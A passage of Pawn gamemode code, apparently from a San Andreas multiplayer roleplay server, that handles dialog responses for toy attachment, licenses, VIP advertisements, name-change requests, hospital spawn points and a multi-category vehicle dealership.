				    EditAttachedObject(playerid, toyslot[playerid]);
				}
			}
	    }
	    else ShowDialog(playerid, 23);
	}
	else if(dialogid == 25)
	{
	    if(response)
	    {
			new bone, index = toyslot[playerid];
	        switch(listitem)
	        {
	            case 0: bone = 1; case 1: bone = 2; case 2: bone = 3; case 3: bone = 4; case 4: bone = 5; case 5: bone = 6;
	            case 6: bone = 7; case 7: bone = 8; case 8: bone = 9; case 9: bone = 10; case 10: bone = 11; case 11: bone = 12;
	            case 12: bone = 13; case 13: bone = 14; case 14: bone = 15; case 15: bone = 16; case 16: bone = 17; case 17: bone = 18;
	        }
			//SetPlayerAttachedObject(playerid, index, Player[playerid][pToyModel][index], bone, Float:Player[playerid][pToyX][index], Float:Player[playerid][pToyY][index], Float:Player[playerid][pToyZ][index], Float:Player[playerid][pToyRX][index], Float:Player[playerid][pToyRY][index], Float:Player[playerid][pToyRZ][index], Float:Player[playerid][pToySX][index], Float:Player[playerid][pToySY][index], Float:Player[playerid][pToySZ][index]);
			//
			SetPlayerAttachedObject(playerid, index, Player[playerid][pToyModel][index], bone, Float:Player[playerid][pToyX][index], Float:Player[playerid][pToyY][index], Float:Player[playerid][pToyZ][index], Float:Player[playerid][pToyRX][index], Float:Player[playerid][pToyRY][index], Float:Player[playerid][pToyRZ][index], Float:Player[playerid][pToySX][index], Float:Player[playerid][pToySY][index], Float:Player[playerid][pToySZ][index]);
	    }
	    else ShowDialog(playerid, 24);
	}
	else if(dialogid == 26)
	{
		if(response)
		{
		    switch(listitem)
		    {
				case 0: // Driving
				{
				    if(Player[playerid][pCarLic]) return SendClientMessage(playerid, COLOR_GRAD2, "You already have a drivers license.");
                    //if(Player[playerid][pMoney] < 800) return SendClientMessage(playerid, COLOR_GRAD2, "You've insufficient funds. ($800)");
	                //GiveZamoraMoney(playerid, -800);
                 	//Player[playerid][pCarLic] = 1;
                 	LicenseTest[playerid] = 1;
                 	SendClientMessage(playerid,COLOR_LIGHTBLUE,"* License Center: Please get inside a vehicle outside.");
				}
				case 1: // Flying
				{
				    if(Player[playerid][pFlyLic]) return SendClientMessage(playerid, COLOR_GRAD2, "You already have a flying license.");
				    if(Player[playerid][pMoney] < 8000) return SendClientMessage(playerid, COLOR_GRAD2,"You've insufficient funds. ($8,000)");
	                GiveZamoraMoney(playerid, -8000);
	                Player[playerid][pFlyLic] = 1;
	                SendClientMessage(playerid,COLOR_LIGHTBLUE,"* License Center: You've successfully bought a new flying license.");
				}
				case 2: // Weapon
				{
				    if(Player[playerid][pGunLic]) return SendClientMessage(playerid, COLOR_GRAD2, "You already have a weapon license.");
				    if(Player[playerid][pMoney] < 12000) return SendClientMessage(playerid, COLOR_GRAD2, "You've insufficient funds. ($12,000)");
	                GiveZamoraMoney(playerid, -12000);
	                Player[playerid][pGunLic] = 1;
	                SendClientMessage(playerid,COLOR_LIGHTBLUE,"* License Center: You've successfully bought a new weapon license.");
				}
				case 3: // Fishing
				{
				    if(Player[playerid][pFishLic]) return SendClientMessage(playerid, COLOR_GRAD2, "You already have a fishing license.");
				    if(Player[playerid][pMoney] < 2000) return SendClientMessage(playerid, COLOR_GRAD2, "You've insufficient funds. ($2,000)");
	                GiveZamoraMoney(playerid, -2000);
	                Player[playerid][pFishLic] = 1;
	                SendClientMessage(playerid,COLOR_LIGHTBLUE,"* License Center: You've successfully bought a new fishing license.");
				}
		    }
		}
	}
	else if(dialogid == 27)
	{
	    if(response)
	    {
	        new string[128];
	        switch(listitem)
	        {
		        case 0:
		        {
		        	GiveZamoraWeapon(playerid, 43, 999999);
	                format(string, sizeof(string), "* %s grabs a Camera from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    		}
		        case 1:
		        {
		            ShowDialog(playerid, 7);
		        }
	        }
	    }
	}
	else if(dialogid == 28)
	{
	    if(response)
	    {
		    switch(listitem)
		    {
	            case 0: // VIP Age
		        {
                    if(Player[playerid][pVIP] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a VIP.");
		            VIP[playerid] = 1;
		            ShowDialog(playerid, 4);
		        }
		        case 1: // VIP Gender
		        {
		            if(Player[playerid][pVIP] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a VIP.");
		            VIP[playerid] = 1;
		            ShowDialog(playerid, 3);
                }
                case 2: // VIP Name
		        {
		            if(Player[playerid][pVIP] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Gold VIP.");
		            ShowDialog(playerid, 18);
                }
             }
	    }
	}
	else if(dialogid == 29)
	{
		if(response)
		{
		    switch(listitem)
		    {
				case 0:
				{
				    if(Player[playerid][pVIP] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You are not Silver VIP.");
					ShowDialog(playerid, 20);
				}
				case 1:
				{
				    if(Player[playerid][pVIP] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You are not Silver VIP.");
					ShowDialog(playerid, 30);
				}
				case 2:
				{
				    if(Player[playerid][pVIP] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You are not Silver VIP.");
					ShowDialog(playerid, 31);
				}
				case 3:
				{
				    if(Player[playerid][pVIP] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You are not Silver VIP.");
					ShowDialog(playerid, 33);
				}
		    }
		}
	}
	else if(dialogid == 30) // VIP /ad
	{
	    new string[128];
	    if(strlen(inputtext) == 0) return 1;
		if(strlen(inputtext) > 64) return SendClientMessage(playerid, COLOR_GRAD2, "Maximum characters allowed per advertisement are 64.");
		// Advertisement
		format(string, sizeof(string), "Advertisement: %s, Contact: %s - Ph: %d", inputtext, GetName(playerid), Player[playerid][pPhone]);
		SendClientMessageToAll(COLOR_ORANGE, string);
	}
	else if(dialogid == 31) // VIP /ad
	{
	    new string[128];
	    if(strlen(inputtext) == 0) return 1;
		if(strlen(inputtext) > 64) return SendClientMessage(playerid, COLOR_GRAD2, "Maximum characters allowed per advertisement are 64.");
		// Advertisement
		format(string, sizeof(string), "Advertisement: %s, Contact: %s - Ph: %d", inputtext, GetName(playerid), Player[playerid][pPhone]);
		SendClientMessageToAll(COLOR_PINK, string);
	}
	else if(dialogid == 32)
	{
	    if(response)
	    {
	        new string[128];
	        format(PlayerName[playerid], MAX_PLAYER_NAME, "%s", inputtext);
	        NameRequester = playerid;
	        format(string, sizeof(string), "AdminWarning: Player %s has requested a namechange to %s. (/approve pnamechange) (/deny pnamechange)", GetName(playerid), PlayerName[playerid]);
	        SendAdminMessage(COLOR_ADMWARN,  string);
	    }
	}
	else if(dialogid == 33) // VIP /ad
	{
	    new string[128];
	    if(strlen(inputtext) == 0) return 1;
		if(strlen(inputtext) > 64) return SendClientMessage(playerid, COLOR_GRAD2, "Maximum characters allowed per advertisement are 64.");
		// Advertisement
		format(string, sizeof(string), "Advertisement: %s, Contact: %s - Ph: %d", inputtext, GetName(playerid), Player[playerid][pPhone]);
		SendClientMessageToAll(COLOR_RED, string);
	}
	else if(dialogid == 34)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
				case 0:
				{
             	    SendClientMessage(playerid, COLOR_WHITE, "* You have choosed the spawn after hospital in the Gym");
             	    vPos[playerid][0] = 2224.8137;
             	    vPos[playerid][1] = -1723.4457;
             	    vPos[playerid][2] = 13.5625;
				}
				case 1:
                {
	                SendClientMessage(playerid, COLOR_WHITE, "* You have choosed the spawn after hospital in the LSPD");
             	    vPos[playerid][0] = 1515.2551;
             	    vPos[playerid][1] = -1666.3148;
             	    vPos[playerid][2] = 14.0469;
				}
				case 2:
                {
	                SendClientMessage(playerid, COLOR_WHITE, "* You have choosed the spawn after hospital in the All Saints Hospital");
             	    vPos[playerid][0] = 1177.5485;
             	    vPos[playerid][1] = -1323.5773;
             	    vPos[playerid][2] = 14.0761;
				}
	        }
	    }
	}
	else if(dialogid == 35) // Dealership main
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: ShowDialog(playerid, 36); // Regular Cars
	            case 1: ShowDialog(playerid, 37); // Low Riders
	            case 2: ShowDialog(playerid, 38); // Saloon
	            case 3: ShowDialog(playerid, 39); // 4x4/Off_Roaders
	            case 4: ShowDialog(playerid, 40); // Bikes
	            case 5: ShowDialog(playerid, 41); // Exotic Cars
	            case 6: ShowDialog(playerid, 42); // Sports Cars
	        }
	    }
	}
	else if(dialogid == 36) // Regular Cars
	{
	    new string[256], carid, price;
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: {carid = 496; price = 200000;}
	            case 1: {carid = 542; price = 100000;}
	            case 2: {carid = 439; price = 180000;}
	            case 3: {carid = 549; price = 200000;}
	        }
	        if(price > Player[playerid][pMoney]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
			GiveZamoraMoney(playerid, -price);
         	format(string, sizeof(string), " You have purchased a %s.", RVN(carid));
	        SendClientMessage(playerid, COLOR_GREEN, string);
	        if(Player[playerid][vModel] && Player[playerid][vVModel] && Player[playerid][vVVModel])
	        {
				if(Player[playerid][pVIP] >= 3)
				{
	                Player[playerid][pVVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
                 	SetVehicleParamsEx(Player[playerid][pVVVVeh], 0, 0, 0, 1, 0, 0, 0);
                 	Player[playerid][vVVVLocked] = 1;
                 	Player[playerid][vVVVModel] = carid;
             		GetVehiclePos(Player[playerid][pVVVVeh], Player[playerid][vVVVX], Player[playerid][vVVVY], Player[playerid][vVVVZ]);
            		GetVehicleZAngle(Player[playerid][pVVVVeh], Player[playerid][vVVVA]);
            		Player[playerid][vVVVC1] = 0;
            		Player[playerid][vVVVC2] = 0;
            	}
				return 1;
	        }
	        if(Player[playerid][vModel] && Player[playerid][vVModel])
	        {
                if(Player[playerid][pLevel] >= 10)
				{
	                Player[playerid][pVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	    	        SetVehicleParamsEx(Player[playerid][pVVVeh], 0, 0, 0, 0, 0, 0, 0);
	    	        Player[playerid][vVVLocked] = 0;
	    	        Player[playerid][vVVModel] = carid;
	    			GetVehiclePos(Player[playerid][pVVVeh], Player[playerid][vVVX], Player[playerid][vVVY], Player[playerid][vVVZ]);
		    		GetVehicleZAngle(Player[playerid][pVVVeh], Player[playerid][vVVA]);
		    		Player[playerid][vVVC1] = 0;
		    		Player[playerid][vVVC2] = 0;
		    	}
				return 1;
	        }
	        if(Player[playerid][vModel])
	        {
				if(Player[playerid][pLevel] >= 2)
				{
	                Player[playerid][pVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
     		        SetVehicleParamsEx(Player[playerid][pVVeh], 0, 0, 0, 0, 0, 0, 0);
     		        Player[playerid][vVLocked] = 0;
    		        Player[playerid][vVModel] = carid;
    				GetVehiclePos(Player[playerid][pVVeh], Player[playerid][vVX], Player[playerid][vVY], Player[playerid][vVZ]);
	    			GetVehicleZAngle(Player[playerid][pVVeh], Player[playerid][vVA]);
	    			Player[playerid][vVC1] = 0;
		    		Player[playerid][vVC2] = 0;
				}
				return 1;
	        }
	        Player[playerid][pVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	        SetVehicleParamsEx(Player[playerid][pVeh], 0, 0, 0, 0, 0, 0, 0);
	        Player[playerid][vLocked] = 0;
	        Player[playerid][vModel] = carid;
			GetVehiclePos(Player[playerid][pVeh], Player[playerid][vX], Player[playerid][vY], Player[playerid][vZ]);
			GetVehicleZAngle(Player[playerid][pVeh], Player[playerid][vA]);
			Player[playerid][vC1] = 0;
			Player[playerid][vC2] = 0;
	    }
	}
	else if(dialogid == 37) //  Lowriders
	{
	    new string[256], carid, price;
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: {carid = 536; price = 220000;}
	            case 1: {carid = 534; price = 175000;}
	            case 2: {carid = 567; price = 250000;}
	            case 3: {carid = 535; price = 280000;}
	            case 4: {carid = 576; price = 230000;}
	        }
	        if(price > Player[playerid][pMoney]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
			GiveZamoraMoney(playerid, -price);
         	format(string, sizeof(string), " You have purchased a %s.", RVN(carid));
	        SendClientMessage(playerid, COLOR_GREEN, string);
	        if(Player[playerid][vModel] && Player[playerid][vVModel] && Player[playerid][vVVModel])
	        {
				if(Player[playerid][pVIP] >= 3)
				{
	                Player[playerid][pVVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
                 	SetVehicleParamsEx(Player[playerid][pVVVVeh], 0, 0, 0, 1, 0, 0, 0);
                 	Player[playerid][vVVVLocked] = 1;
                 	Player[playerid][vVVVModel] = carid;
             		GetVehiclePos(Player[playerid][pVVVVeh], Player[playerid][vVVVX], Player[playerid][vVVVY], Player[playerid][vVVVZ]);
            		GetVehicleZAngle(Player[playerid][pVVVVeh], Player[playerid][vVVVA]);
            		Player[playerid][vVVVC1] = 0;
            		Player[playerid][vVVVC2] = 0;
            	}
				return 1;
	        }
	        if(Player[playerid][vModel] && Player[playerid][vVModel])
	        {
                if(Player[playerid][pLevel] >= 10)
				{
	                Player[playerid][pVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	    	        SetVehicleParamsEx(Player[playerid][pVVVeh], 0, 0, 0, 0, 0, 0, 0);
	    	        Player[playerid][vVVLocked] = 0;
	    	        Player[playerid][vVVModel] = carid;
	    			GetVehiclePos(Player[playerid][pVVVeh], Player[playerid][vVVX], Player[playerid][vVVY], Player[playerid][vVVZ]);
		    		GetVehicleZAngle(Player[playerid][pVVVeh], Player[playerid][vVVA]);
		    		Player[playerid][vVVC1] = 0;
		    		Player[playerid][vVVC2] = 0;
		    	}
				return 1;
	        }
	        if(Player[playerid][vModel])
	        {
				if(Player[playerid][pLevel] >= 2)
				{
	                Player[playerid][pVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
     		        SetVehicleParamsEx(Player[playerid][pVVeh], 0, 0, 0, 0, 0, 0, 0);
     		        Player[playerid][vVLocked] = 0;
    		        Player[playerid][vVModel] = carid;
    				GetVehiclePos(Player[playerid][pVVeh], Player[playerid][vVX], Player[playerid][vVY], Player[playerid][vVZ]);
	    			GetVehicleZAngle(Player[playerid][pVVeh], Player[playerid][vVA]);
	    			Player[playerid][vVC1] = 0;
		    		Player[playerid][vVC2] = 0;
				}
				return 1;
	        }
	        Player[playerid][pVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	        SetVehicleParamsEx(Player[playerid][pVeh], 0, 0, 0, 0, 0, 0, 0);
	        Player[playerid][vLocked] = 0;
	        Player[playerid][vModel] = carid;
			GetVehiclePos(Player[playerid][pVeh], Player[playerid][vX], Player[playerid][vY], Player[playerid][vZ]);
			GetVehicleZAngle(Player[playerid][pVeh], Player[playerid][vA]);
			Player[playerid][vC1] = 0;
			Player[playerid][vC2] = 0;
	    }
	}
	else if(dialogid == 38) //  Saloon
	{
	    new string[256], carid, price;
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: {carid = 507; price = 240000;}
	            case 1: {carid = 426; price = 290000;}
	            case 2: {carid = 405; price = 250000;}
	            case 3: {carid = 550; price = 230000;}
	            case 4: {carid = 421; price = 190000;}
	        }
	        if(price > Player[playerid][pMoney]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
			GiveZamoraMoney(playerid, -price);
         	format(string, sizeof(string), " You have purchased a %s.", RVN(carid));
	        SendClientMessage(playerid, COLOR_GREEN, string);
	        if(Player[playerid][vModel] && Player[playerid][vVModel] && Player[playerid][vVVModel])
	        {
				if(Player[playerid][pVIP] >= 3)
				{
	                Player[playerid][pVVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
                 	SetVehicleParamsEx(Player[playerid][pVVVVeh], 0, 0, 0, 1, 0, 0, 0);
                 	Player[playerid][vVVVLocked] = 1;
                 	Player[playerid][vVVVModel] = carid;
             		GetVehiclePos(Player[playerid][pVVVVeh], Player[playerid][vVVVX], Player[playerid][vVVVY], Player[playerid][vVVVZ]);
            		GetVehicleZAngle(Player[playerid][pVVVVeh], Player[playerid][vVVVA]);
            		Player[playerid][vVVVC1] = 0;
            		Player[playerid][vVVVC2] = 0;
            	}
				return 1;
	        }
	        if(Player[playerid][vModel] && Player[playerid][vVModel])
	        {
                if(Player[playerid][pLevel] >= 10)
				{
	                Player[playerid][pVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	    	        SetVehicleParamsEx(Player[playerid][pVVVeh], 0, 0, 0, 0, 0, 0, 0);
	    	        Player[playerid][vVVLocked] = 0;
	    	        Player[playerid][vVVModel] = carid;
	    			GetVehiclePos(Player[playerid][pVVVeh], Player[playerid][vVVX], Player[playerid][vVVY], Player[playerid][vVVZ]);
		    		GetVehicleZAngle(Player[playerid][pVVVeh], Player[playerid][vVVA]);
		    		Player[playerid][vVVC1] = 0;
		    		Player[playerid][vVVC2] = 0;
		    	}
				return 1;
	        }
	        if(Player[playerid][vModel])
	        {
				if(Player[playerid][pLevel] >= 2)
				{
	                Player[playerid][pVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
     		        SetVehicleParamsEx(Player[playerid][pVVeh], 0, 0, 0, 0, 0, 0, 0);
     		        Player[playerid][vVLocked] = 0;
    		        Player[playerid][vVModel] = carid;
    				GetVehiclePos(Player[playerid][pVVeh], Player[playerid][vVX], Player[playerid][vVY], Player[playerid][vVZ]);
	    			GetVehicleZAngle(Player[playerid][pVVeh], Player[playerid][vVA]);
	    			Player[playerid][vVC1] = 0;
		    		Player[playerid][vVC2] = 0;
				}
				return 1;
	        }
	        Player[playerid][pVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	        SetVehicleParamsEx(Player[playerid][pVeh], 0, 0, 0, 0, 0, 0, 0);
	        Player[playerid][vLocked] = 0;
	        Player[playerid][vModel] = carid;
			GetVehiclePos(Player[playerid][pVeh], Player[playerid][vX], Player[playerid][vY], Player[playerid][vZ]);
			GetVehicleZAngle(Player[playerid][pVeh], Player[playerid][vA]);
			Player[playerid][vC1] = 0;
			Player[playerid][vC2] = 0;
	    }
	}
	else if(dialogid == 39) //  4x4
	{
	    new string[256], carid, price;
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: {carid = 579; price = 320000;}
	            case 1: {carid = 400; price = 270000;}
	            case 2: {carid = 500; price = 250000;}
	            case 3: {carid = 505; price = 300000;}
	            case 4: {carid = 495; price = 430000;}
	            case 5: {carid = 554; price = 240000;}
	        }
	        if(price > Player[playerid][pMoney]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
			GiveZamoraMoney(playerid, -price);
         	format(string, sizeof(string), " You have purchased a %s.", RVN(carid));
	        SendClientMessage(playerid, COLOR_GREEN, string);
	        if(Player[playerid][vModel] && Player[playerid][vVModel] && Player[playerid][vVVModel])
	        {
				if(Player[playerid][pVIP] >= 3)
				{
	                Player[playerid][pVVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
                 	SetVehicleParamsEx(Player[playerid][pVVVVeh], 0, 0, 0, 1, 0, 0, 0);
                 	Player[playerid][vVVVLocked] = 1;
                 	Player[playerid][vVVVModel] = carid;
             		GetVehiclePos(Player[playerid][pVVVVeh], Player[playerid][vVVVX], Player[playerid][vVVVY], Player[playerid][vVVVZ]);
            		GetVehicleZAngle(Player[playerid][pVVVVeh], Player[playerid][vVVVA]);
            		Player[playerid][vVVVC1] = 0;
            		Player[playerid][vVVVC2] = 0;
            	}
				return 1;
	        }
	        if(Player[playerid][vModel] && Player[playerid][vVModel])
	        {
                if(Player[playerid][pLevel] >= 10)
				{
	                Player[playerid][pVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	    	        SetVehicleParamsEx(Player[playerid][pVVVeh], 0, 0, 0, 0, 0, 0, 0);
	    	        Player[playerid][vVVLocked] = 0;
	    	        Player[playerid][vVVModel] = carid;
	    			GetVehiclePos(Player[playerid][pVVVeh], Player[playerid][vVVX], Player[playerid][vVVY], Player[playerid][vVVZ]);
		    		GetVehicleZAngle(Player[playerid][pVVVeh], Player[playerid][vVVA]);
		    		Player[playerid][vVVC1] = 0;
		    		Player[playerid][vVVC2] = 0;
		    	}
				return 1;
	        }
	        if(Player[playerid][vModel])
	        {
				if(Player[playerid][pLevel] >= 2)
				{
	                Player[playerid][pVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
     		        SetVehicleParamsEx(Player[playerid][pVVeh], 0, 0, 0, 0, 0, 0, 0);
     		        Player[playerid][vVLocked] = 0;
    		        Player[playerid][vVModel] = carid;
    				GetVehiclePos(Player[playerid][pVVeh], Player[playerid][vVX], Player[playerid][vVY], Player[playerid][vVZ]);
	    			GetVehicleZAngle(Player[playerid][pVVeh], Player[playerid][vVA]);
	    			Player[playerid][vVC1] = 0;
		    		Player[playerid][vVC2] = 0;
				}
				return 1;
	        }
	        Player[playerid][pVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	        SetVehicleParamsEx(Player[playerid][pVeh], 0, 0, 0, 0, 0, 0, 0);
	        Player[playerid][vLocked] = 0;
	        Player[playerid][vModel] = carid;
			GetVehiclePos(Player[playerid][pVeh], Player[playerid][vX], Player[playerid][vY], Player[playerid][vZ]);
			GetVehicleZAngle(Player[playerid][pVeh], Player[playerid][vA]);
			Player[playerid][vC1] = 0;
			Player[playerid][vC2] = 0;
	    }
	}
	else if(dialogid == 40) //  bikes
	{
	    new string[256], carid, price;
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: {carid = 586; price = 150000;}
	            case 1: {carid = 521; price = 225000;}
	            case 2: {carid = 461; price = 200000;}
	            case 3: {carid = 463; price = 175000;}
	            case 4: {carid = 468; price = 85000;}
	            case 5: {carid = 481; price = 10000;}
	        }
	        if(price > Player[playerid][pMoney]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
			GiveZamoraMoney(playerid, -price);
         	format(string, sizeof(string), " You have purchased a %s.", RVN(carid));
	        SendClientMessage(playerid, COLOR_GREEN, string);
	        if(Player[playerid][vModel] && Player[playerid][vVModel] && Player[playerid][vVVModel])
	        {
				if(Player[playerid][pVIP] >= 3)
				{
	                Player[playerid][pVVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
                 	SetVehicleParamsEx(Player[playerid][pVVVVeh], 0, 0, 0, 1, 0, 0, 0);
                 	Player[playerid][vVVVLocked] = 1;
                 	Player[playerid][vVVVModel] = carid;
             		GetVehiclePos(Player[playerid][pVVVVeh], Player[playerid][vVVVX], Player[playerid][vVVVY], Player[playerid][vVVVZ]);
            		GetVehicleZAngle(Player[playerid][pVVVVeh], Player[playerid][vVVVA]);
            		Player[playerid][vVVVC1] = 0;
            		Player[playerid][vVVVC2] = 0;
            	}
				return 1;
	        }
	        if(Player[playerid][vModel] && Player[playerid][vVModel])
	        {
                if(Player[playerid][pLevel] >= 10)
				{
	                Player[playerid][pVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	    	        SetVehicleParamsEx(Player[playerid][pVVVeh], 0, 0, 0, 0, 0, 0, 0);
	    	        Player[playerid][vVVLocked] = 0;
	    	        Player[playerid][vVVModel] = carid;
	    			GetVehiclePos(Player[playerid][pVVVeh], Player[playerid][vVVX], Player[playerid][vVVY], Player[playerid][vVVZ]);
		    		GetVehicleZAngle(Player[playerid][pVVVeh], Player[playerid][vVVA]);
		    		Player[playerid][vVVC1] = 0;
		    		Player[playerid][vVVC2] = 0;
		    	}
				return 1;
	        }
	        if(Player[playerid][vModel])
	        {
				if(Player[playerid][pLevel] >= 2)
				{
	                Player[playerid][pVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
     		        SetVehicleParamsEx(Player[playerid][pVVeh], 0, 0, 0, 0, 0, 0, 0);
     		        Player[playerid][vVLocked] = 0;
    		        Player[playerid][vVModel] = carid;
    				GetVehiclePos(Player[playerid][pVVeh], Player[playerid][vVX], Player[playerid][vVY], Player[playerid][vVZ]);
	    			GetVehicleZAngle(Player[playerid][pVVeh], Player[playerid][vVA]);
	    			Player[playerid][vVC1] = 0;
		    		Player[playerid][vVC2] = 0;
				}
				return 1;
	        }
	        Player[playerid][pVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	        SetVehicleParamsEx(Player[playerid][pVeh], 0, 0, 0, 0, 0, 0, 0);
	        Player[playerid][vLocked] = 0;
	        Player[playerid][vModel] = carid;
			GetVehiclePos(Player[playerid][pVeh], Player[playerid][vX], Player[playerid][vY], Player[playerid][vZ]);
			GetVehicleZAngle(Player[playerid][pVeh], Player[playerid][vA]);
			Player[playerid][vC1] = 0;
			Player[playerid][vC2] = 0;
	    }
	}
	else if(dialogid == 41) //  Exotic Cars
	{
	    new string[256], carid, price;
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: {carid = 429; price = 550000;}
	            case 1: {carid = 402; price = 640000;}
	            case 2: {carid = 558; price = 250000;}
	            case 3: {carid = 589; price = 265000;}
	            case 4: {carid = 602; price = 215000;}
	        }
	        if(price > Player[playerid][pMoney]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
			GiveZamoraMoney(playerid, -price);
         	format(string, sizeof(string), " You have purchased a %s.", RVN(carid));
	        SendClientMessage(playerid, COLOR_GREEN, string);
	        if(Player[playerid][vModel] && Player[playerid][vVModel] && Player[playerid][vVVModel])
	        {
				if(Player[playerid][pVIP] >= 3)
				{
	                Player[playerid][pVVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
                 	SetVehicleParamsEx(Player[playerid][pVVVVeh], 0, 0, 0, 1, 0, 0, 0);
                 	Player[playerid][vVVVLocked] = 1;
                 	Player[playerid][vVVVModel] = carid;
             		GetVehiclePos(Player[playerid][pVVVVeh], Player[playerid][vVVVX], Player[playerid][vVVVY], Player[playerid][vVVVZ]);
            		GetVehicleZAngle(Player[playerid][pVVVVeh], Player[playerid][vVVVA]);
            		Player[playerid][vVVVC1] = 0;
            		Player[playerid][vVVVC2] = 0;
            	}
				return 1;
	        }
	        if(Player[playerid][vModel] && Player[playerid][vVModel])
	        {
                if(Player[playerid][pLevel] >= 10)
				{
	                Player[playerid][pVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	    	        SetVehicleParamsEx(Player[playerid][pVVVeh], 0, 0, 0, 0, 0, 0, 0);
	    	        Player[playerid][vVVLocked] = 0;
	    	        Player[playerid][vVVModel] = carid;
	    			GetVehiclePos(Player[playerid][pVVVeh], Player[playerid][vVVX], Player[playerid][vVVY], Player[playerid][vVVZ]);
		    		GetVehicleZAngle(Player[playerid][pVVVeh], Player[playerid][vVVA]);
		    		Player[playerid][vVVC1] = 0;
		    		Player[playerid][vVVC2] = 0;
		    	}
				return 1;
	        }
	        if(Player[playerid][vModel])
	        {
				if(Player[playerid][pLevel] >= 2)
				{
	                Player[playerid][pVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
     		        SetVehicleParamsEx(Player[playerid][pVVeh], 0, 0, 0, 0, 0, 0, 0);
     		        Player[playerid][vVLocked] = 0;
    		        Player[playerid][vVModel] = carid;
    				GetVehiclePos(Player[playerid][pVVeh], Player[playerid][vVX], Player[playerid][vVY], Player[playerid][vVZ]);
	    			GetVehicleZAngle(Player[playerid][pVVeh], Player[playerid][vVA]);
	    			Player[playerid][vVC1] = 0;
		    		Player[playerid][vVC2] = 0;
				}
				return 1;
	        }
	        Player[playerid][pVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
	        SetVehicleParamsEx(Player[playerid][pVeh], 0, 0, 0, 0, 0, 0, 0);
	        Player[playerid][vLocked] = 0;
	        Player[playerid][vModel] = carid;
			GetVehiclePos(Player[playerid][pVeh], Player[playerid][vX], Player[playerid][vY], Player[playerid][vZ]);
			GetVehicleZAngle(Player[playerid][pVeh], Player[playerid][vA]);
			Player[playerid][vC1] = 0;
			Player[playerid][vC2] = 0;
	    }
	}
	else if(dialogid == 42) //  Sports Cars
	{
	    new string[256], carid, price;
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: {carid = 415; price = 1250000;}
	            case 1: {carid = 541; price = 1750000;}
	            case 2: {carid = 411; price = 2750000;}
	            case 3: {carid = 451; price = 2250000;}
	            case 4: {carid = 587; price = 270000;}
	            case 5: {carid = 560; price = 330000;}
	            case 6: {carid = 559; price = 325000;}
	            case 7: {carid = 480; price = 375000;}
	        }
	        if(price > Player[playerid][pMoney]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
			GiveZamoraMoney(playerid, -price);
         	format(string, sizeof(string), " You have purchased a %s.", RVN(carid));
	        SendClientMessage(playerid, COLOR_GREEN, string);
	        if(Player[playerid][vModel] && Player[playerid][vVModel] && Player[playerid][vVVModel])
	        {
				if(Player[playerid][pVIP] >= 3)
				{
	                Player[playerid][pVVVVeh] = CreateVehicle(carid, 532.3726,-1287.4926,17.2422,272.3125,1,1,1200);
                 	SetVehicleParamsEx(Player[playerid][pVVVVeh], 0, 0, 0, 1, 0, 0, 0);
